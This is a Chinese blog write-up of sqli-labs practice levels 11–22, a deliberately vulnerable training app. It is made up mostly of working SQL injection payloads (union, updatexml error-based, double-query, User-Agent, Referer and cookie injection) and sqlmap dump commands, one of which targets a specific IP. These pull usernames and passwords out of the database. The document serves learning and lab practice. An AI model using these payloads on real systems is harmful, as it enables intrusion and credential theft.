<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1' union select </span><br><span class="line">1,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where </span><br><span class="line"><span class="attribute">table_schema</span>=<span class="string">'security'</span> <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>

<p><strong>爆内容</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=1&amp;passwd=1' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(username),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/4.png" alt><br>sqlmap:<br>sqlmap -r sql.txt –dbms mysql –dbs –batch<br><img src="/2020/02/27/sqli_labs--less-1-10/5.png" alt></p>
<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>经过测试，passwd=1’  不报错<br> passwd=1”   报错<br>passwd=1”–+  还是报错，于是参考前面添加括号发现passwd=1”)–+正常，于是知道为双引号加括号闭合。剩下的步骤与less-11一样<br>爆内容</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">group_concat</span>(<span class="title">username</span>),<span class="title">group_concat</span>(<span class="title">password</span>) <span class="title">from</span> <span class="title">users</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/6.png" alt></p>
<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1`和`uname=1&amp;passwd=1"不报错</span><br><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1'报错,缺少一个括号</span><br><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1')--+闭合不报错</span><br><span class="line"><span class="attribute">uname</span>=1&amp;passwd=1') union select database(),user()--+`居然无回显</span><br></pre></td></tr></table></figure>

<p>查了一下，与前面的less-5差不多，要使用双查询注入<br>尝试一个报错注入payload,成功爆库</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>') and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/7.png" alt><br>双查询注入：<br>爆数据库：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> count(*),concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),(<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>如果一次没有成功可以多放几次包，因为里面有个随机数，不一定每次都报错<br><img src="/2020/02/27/sqli_labs--less-1-10/8.png" alt><br>爆表名：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> count(*),concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>表名并没有爆出来，换一种方法，使用报错注入。<br>报错注入：<br>updatexml报错注入原理<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值使之不符合XPATH_string的格式，则会爆出错误。</p>
<p>暴库：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>') or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<p>爆表名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1') or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/9.png" alt><br>爆列名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1') or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/10.png" alt><br>报数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1') or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/11.png" alt></p>
<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>输入passwd=1和passwd=1’ 均不报错，输入passwd=1”时报错，闭合后不报错。所以为双引号闭合，使用报错注入，与less-13一样<br>直接爆内容：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1" or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/12.png" alt></p>
<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>这里开始，发现没有任何回显。但是会有颜色改变<br><img src="/2020/02/27/sqli_labs--less-1-10/13.png" alt><br><img src="/2020/02/27/sqli_labs--less-1-10/14.png" alt><br>一次测试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>’ <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>” <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>’) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>”) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br></pre></td></tr></table></figure>

<p>发现单引号闭合能正常回显，所以可以尝试bool盲注或者时间盲注，由于python还在学习，所以脚本还不能现写，以前都是get盲注。所以就用sqlmap凑合一下吧<del>_</del><br>抓包将post信息写入文件中：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt <span class="comment">--dbms mysql --dbs --batch --technique T</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/15.png" alt><br>然后就不一个一个爆了，很慢</p>
<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>与第15关一样，依次测试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>’ <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>” <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>’) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>”) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>–+</span><br></pre></td></tr></table></figure>

<p>最后发现uname=1&amp;passwd=1”) or 1=1–+成功登陆<br><img src="/2020/02/27/sqli_labs--less-1-10/16.png" alt><br>直接sqlmap梭哈</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> --dbms mysql --dbs  --technique T -<span class="selector-tag">p</span> passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/17.png" alt></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt -D security -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure>

<p>不想等了，不应该直接dump，就这样吧<br><img src="/2020/02/27/sqli_labs--less-1-10/18.png" alt></p>
<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>这一关是基于错误_POST_更新查询注入，模拟的是修改密码界面注入而非登陆时注入<br>不管我们怎么输入，都只是返回一张红色的界面<br><img src="/2020/02/27/sqli_labs--less-1-10/19.png" alt><br>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line">@$sql = <span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    $row1 = $row[<span class="string">'username'</span>];   </span><br><span class="line">    $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">    mysql_query($update);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mysql_error())</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag1.jpg"/&gt;'</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg"/&gt;'</span>;</span><br></pre></td></tr></table></figure>

<p>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
<h2 id="一些PHP语法："><a href="#一些PHP语法：" class="headerlink" title="一些PHP语法："></a>一些PHP语法：</h2><p>substr()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr(string,start[,length])</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>string</code></p>
<p>输入字符串。       </p>
</li>
<li><p><code>start</code></p>
<p>如果 <code>start</code> 是非负数，返回的字符串将从 <code>string</code> 的 <code>start</code> 位置开始，从 0 开始计算。例如，在字符串 “<em>abcdef</em>“ 中，在位置 <em>0</em> 的字符是 “<em>a</em>“，位置 <em>2</em> 的字符串是 “<em>c</em>“ 等等。              </p>
<p>如果 <code>start</code> 是负数，返回的字符串将从 <code>string</code> 结尾处向前数第 <code>start</code> 个字符开始。              </p>
<p>如果 <code>string</code> 的长度小于或等于 <code>start</code>，将返回 <strong>FALSE</strong>。 </p>
</li>
<li><p><code>length</code></p>
<p>如果提供了正数的 <code>length</code>，返回的字符串将从 <code>start</code> 处开始最多包括 <code>length</code> 个字符（取决于 <code>string</code> 的长度）。              </p>
<p>如果提供了负数的 <code>length</code>，那么 <code>string</code> 末尾处的许多字符将会被漏掉（若 <code>start</code> 是负数则从字符串尾部算起）。</p>
<p>如果 <code>start</code> 不在这段文本中，那么将返回一个空字符串。              </p>
<p>如果提供了值为 <em>0</em>，<strong>FALSE</strong> 或 <strong>NULL</strong> 的 <code>length</code>，那么将返回一个空字符串。              </p>
<p>如果没有提供 <code>length</code>，返回的子字符串将从 <code>start</code> 位置开始直到字符串结尾。 </p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">0</span>, <span class="number">-1</span>);  <span class="comment">// 返回 "abcde"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">2</span>, <span class="number">-1</span>);  <span class="comment">// 返回 "cde"</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">4</span>, <span class="number">-4</span>);  <span class="comment">// 返回 ""</span></span><br><span class="line">$rest = substr(<span class="string">"abcdef"</span>, <span class="number">-3</span>, <span class="number">-1</span>); <span class="comment">// 返回 "de"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>get_magic_quotes_gpc()函数</p>
<p>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
<p>当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。</p>
<p>addslashes()与stripslashes()函数</p>
<p>addslashes(string)函数返回在预定义字符之前添加反斜杠\的字符串：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">单引号</span> <span class="string">'</span></span><br><span class="line"><span class="meta">双引号</span> <span class="string">"</span></span><br><span class="line"><span class="meta">反斜杠</span> <span class="string">\</span></span><br><span class="line"><span class="meta">空字符</span> <span class="string">NULL</span></span><br></pre></td></tr></table></figure>

<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>stripslashes(string)函数是删除由addslashes()函数添加的反斜杠。</p>
<p>ctype_digit()函数</p>
<p>ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
<p>mysql_real_escape_string()函数</p>
<p>mysql_real_escape_string(string,connection)<br>参数             描述<br>string             必需，规定要转义的字符串<br>connection         可选，规定MySQL连接。如果未规定，则使用上一个连接</p>
<p>mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="tag">\<span class="name">x</span></span>00</span><br><span class="line"><span class="tag">\<span class="name">n</span></span></span><br><span class="line"><span class="tag">\<span class="name">r</span></span></span><br><span class="line"><span class="tag">\</span></span><br><span class="line">'</span><br><span class="line">"</span><br><span class="line"><span class="tag">\<span class="name">x</span></span>1a</span><br></pre></td></tr></table></figure>

<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回FALSE。<br>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于mysql_query()，可使用本函数来预防数据库攻击。</p>
<p>intval()函数</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">intval</span><span class="params">(var[,base])</span></span></span><br></pre></td></tr></table></figure>

<p>参数         描述<br>var             要转换成integer的数量值<br>base         转化所使用的进制</p>
<p>intval()函数获取变量的整数值。通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。</p>
<p>成功时返回var的integer值，失败时返回0。空的array返回0，非空的array返回1，最大的值取决于操作系统。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">如果base是<span class="number">0</span>，通过检测var的格式来决定使用的进制：</span><br><span class="line"></span><br><span class="line">    如果字符串包括了<span class="number">0</span>x或<span class="number">0</span>X的前缀，使用<span class="number">16</span>进制hex；否则，</span><br><span class="line">    如果字符串以<span class="number">0</span>开始，使用<span class="number">8</span>进制octal；否则，</span><br><span class="line">    使用<span class="number">10</span>进制decimal。</span><br></pre></td></tr></table></figure>

<h2 id="参数检查与过滤"><a href="#参数检查与过滤" class="headerlink" title="参数检查与过滤"></a>参数检查与过滤</h2><p>在用uanme查询之前，它用check_input()函数做了检查。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($value))</span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">        $value = <span class="string">"'"</span>.mysql_real_escape_string($value).<span class="string">"'"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        $value = intval($value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>若uname非空，截取它的前15个字符。</p>
</li>
<li><p>若php环境变量magic_quotes_gpc打开，去除转义的反斜杠\。</p>
</li>
<li><p>若uname字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p>
<p>所以我们在uname上面不存在注入点，注入点在passwd</p>
</li>
</ol>
<p>这里我们可以使用报错注入，双查询注入或者时间盲注，但是不可以Bool盲注，因为只要用户名正确回显就是flag.jpg</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>与less-13一样<br>暴库：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>

<p>爆表名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/20.png" alt><br>爆列名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/21.png" alt><br>报数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>但是在这里报错了：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">You can<span class="symbol">'t</span> specify target table <span class="symbol">'users</span>' <span class="keyword">for</span> update <span class="keyword">in</span> FROM clause</span><br></pre></td></tr></table></figure>

<p>不能先select表中的某些值，再update这个表（在同一语句中）。<br>解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> ) a)),<span class="number">0</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/23.png" alt></p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>使用sqlmap </p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> --dbms mysql -teachnique T --dbs -<span class="selector-tag">p</span> passwd</span><br><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> -D <span class="string">"security"</span> -T <span class="string">"users"</span> -C username,password --dump</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/24.png" alt></p>
<h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><p>基于错误_POST_User-Agent_请求头注入<br>不管怎么注入，都只是显示ip<br>查看源码</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>])<span class="comment">;</span></span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>对POST的uname和passwd都做了check_input()处理，所以表单不存在注入点。<br>然后使用已知的账户登陆后发现可以回显，并且显示user-agent和SQL语句。所以判断注入点应该在User-Agent处<br>我们任然可以使用报错注入：<br>先在user-agent后面随便构造一个：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">' updatexml(1,concat('<span class="meta">#',(database())),0)--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/25.png" alt></p>
<p>于是猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’)<br>然后尝试闭合’ ,1,1)#<br>注意：这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#<br>成功闭合<img src="/2020/02/27/sqli_labs--less-1-10/26.png" alt><br>暴库：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/27.png" alt><br>直接报数据：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(username,password) from users),<span class="number">0x7e</span>),<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/28.png" alt><br>我们也可以使用sqlmap</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> --dbms mysql --dbs -<span class="selector-tag">p</span> User-Agent  #前提是要登陆成功</span><br></pre></td></tr></table></figure>

<h1 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h1><p>这一关也是http头注入<br>登陆成功后发现显示的是referer，所以判断应该是referer注入<br>判断INSERT语句结构：<br><img src="/2020/02/27/sqli_labs--less-1-10/29.png" alt><br>于是我们可以这样闭合  ‘  ,1)#<br>正常回显<br><img src="/2020/02/27/sqli_labs--less-1-10/30.png" alt><br>接下来与上一关一样<br>直接爆数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/31.png" alt><br>sqlmap：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql<span class="selector-class">.txt</span> --dbms mysql --dbs -<span class="selector-tag">p</span> Referer</span><br></pre></td></tr></table></figure>

<h1 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h1><p>这一关登陆成功后显示cookie，应该是cookie注入<br><img src="/2020/02/27/sqli_labs--less-1-10/32.png" alt><br>但是并没有找到注入点，然后重新抓包，放一个包后便出现了uname=Dumb，这一个应该才是真正登陆后的cookie,并且登陆界面与不抓包时的登陆界面一样<br><img src="/2020/02/27/sqli_labs--less-1-10/33.png" alt><br>然后尝试在uname点注入，发现是最简单的联合注入<br>直接爆数据吧</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=Dum' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/27/sqli_labs--less-1-10/34.png" alt><br>sqlmap:  这里要添加cookie参数</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://<span class="number">116.62.104.172</span>:<span class="number">81</span>/Less-<span class="number">20</span>/index.php" --cookie "Hm_lvt_5b8626705cec1a357a9db7cf6075c2cb=<span class="number">1583457148</span>,<span class="number">1583713963</span>,<span class="number">1583843632</span>,<span class="number">1583932488</span><span class="comment">;uname=Dumb" --dbs -p cookie</span></span><br></pre></td></tr></table></figure>

<p>sqli-labs的第一页到这来就结束了，还是学到了许多新知识和新方法，断断续续的做了两周，后面还有更难的关卡等着我，继续加油吧！！</p>
<p>参考链接：<a href="https://www.jianshu.com/u/f5a5bfa4f659" target="_blank" rel="noopener">https://www.jianshu.com/u/f5a5bfa4f659</a><br>           <a href="https://www.cnblogs.com/-zhong/p/10925426.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/10925426.html</a></p>
]]></content>
      <tags>
        <tag>sqli_labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs21-37</title>
    <url>/2020/03/17/sqli_labs21-37/</url>
    <content><![CDATA[<p>从page 2开始主要是各种过滤与限制条件<a id="more"></a></p>
<h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>POST – cookie 注入 – base64 编码</p>
<p>一套测试过后，并没有什么发现，也没有回显，然后我们使用admin    admin登录进去看一下，发现显示了cookie，并且uname被base64 加密<br><img src="/2020/03/17/sqli_labs21-37/1.png" alt><br>然后尝试在cookie出进行注入，将注入语句进行base64加密<br>先测试闭合，发现是1‘) or 1=1#单引号加括号闭合</p>
<p><img src="/2020/03/17/sqli_labs21-37/2.png" alt></p>
<p>然后就可以像20关一样进行联合查询,这里就直接查询结果了</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">爆库</span><br><span class="line"><span class="number">1</span><span class="string">') union select 1,2,database()#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表</span></span><br><span class="line"><span class="string">1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">security</span><span class="string">'#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆列</span></span><br><span class="line"><span class="string">1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>#</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line"><span class="number">1</span><span class="string">') union select 1,2,group_concat(username,password) from users#</span></span><br><span class="line"><span class="string">MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/3.png" alt></p>
<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>POST – cookie 注入 – base64 编码<br>这一关是双引号闭合，将上一关的 ‘) 改为 “ 即可</p>
<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>从这一关开始，又是get型了，终于不用抓包了。Page 2 主要是各种过滤与限制条件。<br>开始测试注入类型</p>
